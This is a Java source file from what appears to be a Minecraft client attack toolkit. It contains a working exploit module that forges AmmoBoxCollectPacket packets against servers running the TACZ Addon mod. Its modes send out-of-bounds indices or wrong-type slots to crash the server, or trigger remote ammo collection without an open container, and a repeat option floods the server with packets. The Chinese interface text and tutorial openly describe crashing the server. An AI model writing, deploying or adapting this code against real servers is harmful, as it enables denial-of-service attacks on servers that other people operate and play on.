package com.redblue.red.modules.taczaddon;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.network.chat.Component;
import net.minecraftforge.fml.ModList;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.lang.reflect.Constructor;
import java.util.List;

/**
 * TACZAddon Vuln #3: AmmoBoxCollectPacket OOB + ClassCastException.
 *
 * Server handler has three issues:
 *   1. No bounds check on msg.index -> ArrayIndexOutOfBoundsException
 *   2. No instanceof check -> ClassCastException if slot is not AmmoBoxItem
 *   3. No GUI state check -> can be sent without opening any container
 *
 * Modes:
 *   CRASH_OOB: Send extreme index to trigger ArrayIndexOutOfBoundsException
 *   CRASH_CAST: Send valid index pointing to non-AmmoBoxItem for ClassCastException
 *   COLLECT: Send valid ammo box slot index to trigger remote collect
 */
public class TACZADD03_AmmoBoxCrash implements AttackModule {

    private static final Logger LOGGER = LoggerFactory.getLogger("TACZADD03");

    private static final String NETWORK_HANDLER_CLASS =
            "com.mafuyu404.taczaddon.init.NetworkHandler";
    private static final String CHANNEL_FIELD = "CHANNEL";
    private static final String PACKET_CLASS =
            "com.mafuyu404.taczaddon.network.AmmoBoxCollectPacket";

    private static boolean reflectionResolved = false;
    private static Constructor<?> packetCtor;

    private long lastTick = 0;

    private final List<ConfigParam> params = List.of(
            ConfigParam.ofBool("enabled", "启用", false),
            ConfigParam.ofEnum("mode", "模式",
                    "CRASH_OOB", "CRASH_OOB", "CRASH_CAST", "COLLECT"),
            ConfigParam.ofInt("oob_index", "越界索引", 999, 100, 2147483647)
                    .visibleWhen("mode", "CRASH_OOB"),
            ConfigParam.ofInt("cast_slot", "非弹药箱槽位", 0, 0, 45)
                    .visibleWhen("mode", "CRASH_CAST"),
            ConfigParam.ofInt("ammo_slot", "弹药箱槽位", 0, 0, 45)
                    .visibleWhen("mode", "COLLECT"),
            ConfigParam.ofBool("repeat", "自动重复", false),
            ConfigParam.ofInt("interval", "重复间隔（刻）", 5, 1, 200)
                    .visibleWhen("repeat", "true"),
            ConfigParam.ofInt("packet_count", "每次发包数量", 1, 1, 10)
    );

    @Override public String id() { return "taczadd03_ammobox_crash"; }
    @Override public String name() { return "弹药箱崩溃"; }
    @Override public String description() {
        return "发送畸形弹药箱数据导致服务端崩溃";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
             + "1. 选择模式：CRASH_OOB（越界崩溃）、CRASH_CAST（类型转换崩溃）、COLLECT（收集弹药）\n"
             + "2. 根据模式设置对应参数\n"
             + "3. 点击执行发送数据包\n\n"
             + "[参数说明]\n"
             + "CRASH_OOB：发送极端索引值触发数组越界异常\n"
             + "CRASH_CAST：指向非弹药箱槽位触发类型转换异常\n"
             + "COLLECT：对有效弹药箱槽位触发弹药收集\n\n"
             + "[注意事项]\n"
             + "快速重复发送可能导致服务端日志刷屏和性能下降\n"
             + "每次发包数量控制单次执行的数据包数量，请合理设置";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("taczaddon");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;
        int index = resolveIndex();
        int count = getParam("packet_count").map(ConfigParam::getInt).orElse(1);

        for (int i = 0; i < count; i++) {
            sendAmmoBoxPacket(mc, index);
        }
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        boolean repeat = getParam("repeat").map(ConfigParam::getBool).orElse(false);
        if (!repeat) return;

        int interval = getParam("interval").map(ConfigParam::getInt).orElse(5);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        execute(mc);
    }

    private int resolveIndex() {
        String mode = getParam("mode").map(ConfigParam::getString).orElse("CRASH_OOB");
        return switch (mode) {
            case "CRASH_OOB" -> getParam("oob_index").map(ConfigParam::getInt).orElse(999);
            case "CRASH_CAST" -> getParam("cast_slot").map(ConfigParam::getInt).orElse(0);
            case "COLLECT" -> getParam("ammo_slot").map(ConfigParam::getInt).orElse(0);
            default -> 999;
        };
    }

    private void sendAmmoBoxPacket(Minecraft mc, int index) {
        resolveReflection();
        if (packetCtor == null) {
            chat(mc, "\u00a7c[TACZADD03] Reflection failed - taczaddon not loaded?");
            return;
        }

        try {
            Object packet = packetCtor.newInstance(index);
            boolean ok = PacketForge.sendViaChannel(
                    NETWORK_HANDLER_CLASS, CHANNEL_FIELD, packet);
            if (ok) {
                chat(mc, "\u00a7a[TACZADD03] Sent AmmoBoxCollectPacket(index=" + index + ")");
            } else {
                chat(mc, "\u00a7c[TACZADD03] Send failed");
            }
        } catch (Exception e) {
            LOGGER.error("[TACZADD03] Send failed", e);
            chat(mc, "\u00a7c[TACZADD03] Error: " + e.getMessage());
        }
    }

    private static synchronized void resolveReflection() {
        if (reflectionResolved) return;
        reflectionResolved = true;
        try {
            Class<?> clz = Class.forName(PACKET_CLASS);
            packetCtor = clz.getDeclaredConstructor(int.class);
            packetCtor.setAccessible(true);
            LOGGER.info("[TACZADD03] Reflection resolved");
        } catch (Exception e) {
            LOGGER.error("[TACZADD03] Reflection failed", e);
        }
    }

    private static void chat(Minecraft mc, String msg) {
        if (mc.player != null) {
            mc.player.displayClientMessage(Component.literal(msg), false);
        }
    }
}
